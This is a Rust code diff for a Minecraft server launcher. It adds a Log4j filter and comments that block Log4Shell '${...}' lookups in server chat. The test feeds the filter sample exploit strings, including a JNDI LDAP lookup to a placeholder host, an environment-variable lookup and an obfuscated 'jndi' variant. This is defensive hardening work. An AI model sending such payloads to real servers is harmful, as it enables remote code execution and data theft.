@@ -117,7 +117,7 @@ pub fn create(
 ) -> LauncherResult<WorldFile> {
     let name = validate_name(name)?;
     settings.validate()?;
-    if tuple::find(minecraft).is_none() {
+    if tuple::release(minecraft).is_none() {
         return Err(LauncherError::invalid_input(
             "Worlds are not available for this Minecraft version yet.",
         ));
@@ -212,6 +212,12 @@ pub const LOG_CONFIG: &str = "launcher-log4j2.xml";
 
 /// Console only: the server writes no `logs/` files, so chat and player names
 /// are not stored (ADAPTATION A7). The pattern is the one the launcher reads.
+///
+/// Log4Shell: every release up to 1.18 ships a Log4j 2 that looks up `${...}`
+/// in messages, and a player can put that in chat. The filter drops such a
+/// message before any layout formats it (Mojang's fix for 1.7 to 1.11, whose
+/// Log4j 2.0-beta9 has nothing else); `{nolookups}` is the fix from Log4j 2.7
+/// on (1.12 to 1.16). Every Log4j 2 reads this file, back to 2.0-beta9.
 const SERVER_LOG_CONFIG: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
 <Configuration status="WARN" packages="">
   <Appenders>
@@ -221,6 +227,9 @@ const SERVER_LOG_CONFIG: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
   </Appenders>
   <Loggers>
     <Root level="info">
+      <filters>
+        <RegexFilter regex="(?s).*\$\{[^}]*\}.*" onMatch="DENY" onMismatch="NEUTRAL"/>
+      </filters>
       <AppenderRef ref="Console"/>
     </Root>
   </Loggers>
@@ -270,11 +279,14 @@ pub fn prepare_run(
         ));
     }
     world.settings.validate()?;
+    let release = tuple::release(&world.minecraft).ok_or_else(|| {
+        LauncherError::invalid_input("Worlds are not available for this Minecraft version yet.")
+    })?;
     let dir = root.world_server_dir(world.id);
     std::fs::create_dir_all(&dir).map_err(|e| io(&e))?;
     atomic::write(
         &dir.join("server.properties"),
-        properties::render(&world.settings, binding).as_bytes(),
+        properties::render(&world.settings, binding, release).as_bytes(),
     )
     .map_err(|e| io(&e))?;
     write_whitelist(root, world.id, members)?;
@@ -328,13 +340,17 @@ mod tests {
         for name in ["", "   ", "a\nb", &"n".repeat(65)] {
             assert!(create(&root, name, "1.21.1", WorldSettings::default()).is_err());
         }
-        assert!(create(&root, "x", "1.20.4", WorldSettings::default()).is_err());
+        for version in ["1.7.2", "24w14a", "1.21-pre1", "../1.21.1", ""] {
+            assert!(create(&root, "x", version, WorldSettings::default()).is_err());
+        }
         let bad = WorldSettings {
             max_players: 0,
             ..WorldSettings::default()
         };
         assert!(create(&root, "x", "1.21.1", bad).is_err());
         assert!(list(&root).is_empty());
+        let old = create(&root, "x", "1.7.10", WorldSettings::default()).unwrap();
+        assert_eq!(old.minecraft, "1.7.10");
     }
 
     #[test]
@@ -376,8 +392,37 @@ mod tests {
             whitelist,
             serde_json::json!([{"uuid": "b50ad385-829d-3141-a216-7e7d7539ba7f", "name": "Notch"}])
         );
-        assert!(dir.join(LOG_CONFIG).is_file());
+        assert_eq!(
+            std::fs::read_to_string(dir.join(LOG_CONFIG)).unwrap(),
+            SERVER_LOG_CONFIG
+        );
         let props = std::fs::read_to_string(dir.join("server.properties")).unwrap();
         assert!(props.lines().any(|l| l == "server-port=41000"));
+    }
+
+    #[test]
+    fn the_log_filter_drops_every_lookup() {
+        let (_, rest) = SERVER_LOG_CONFIG
+            .split_once(r#"<RegexFilter regex=""#)
+            .unwrap();
+        let (pattern, rest) = rest.split_once('"').unwrap();
+        assert!(rest.starts_with(r#" onMatch="DENY" onMismatch="NEUTRAL"/>"#));
+        // The same syntax in Java's and this crate's regular expressions.
+        let filter = regex::Regex::new(&format!("^(?:{pattern})$")).unwrap();
+        for message in [
+            "<Mallory> ${jndi:ldap://example.invalid/a}",
+            "[Server] ${java:version}",
+            "<Mallory> line one\n${env:PATH} and more",
+            "${${lower:j}ndi:x}",
+        ] {
+            assert!(filter.is_match(message), "{message}");
+        }
+        for message in [
+            r#"Done (2.093s)! For help, type "help""#,
+            "Notch[/127.0.0.1:52344] logged in with entity id 112 at (8.5, 64.0, 8.5)",
+            "<Notch> costs $5 {really}",
+        ] {
+            assert!(!filter.is_match(message), "{message}");
+        }
     }
 }
